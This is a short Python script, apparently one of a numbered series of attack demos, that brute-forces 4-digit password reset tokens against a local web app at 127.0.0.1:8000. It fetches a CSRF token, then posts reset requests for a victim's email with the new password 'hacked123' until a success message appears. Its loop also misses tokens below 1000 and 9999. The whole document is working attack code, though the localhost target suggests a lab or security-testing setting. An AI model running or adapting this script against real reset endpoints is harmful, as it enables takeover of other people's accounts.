import requests
from bs4 import BeautifulSoup

# 4️⃣ Password Reset Brute Force - Trying all 4-digit reset tokens
RESET_URL = "http://127.0.0.1:8000/password_reset/"
email = "victim@example.com"

LOGIN_URL = "http://127.0.0.1:8000/login/"
session = requests.Session()
login_page = session.get(LOGIN_URL)
soup = BeautifulSoup(login_page.content, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

for reset_token in range(1000, 9999):
    data = {
        "email": email,
        "reset_token": str(reset_token),
        "new_password": "hacked123",
        "csrfmiddlewaretoken": csrf_token
    }
    response = session.post(RESET_URL, data=data, headers={"Referer": RESET_URL})
    print(f"Trying reset token: {reset_token}")
    if "Password reset successful" in response.text:
        print(f"[+] Password reset successful! Token: {reset_token}")
        break
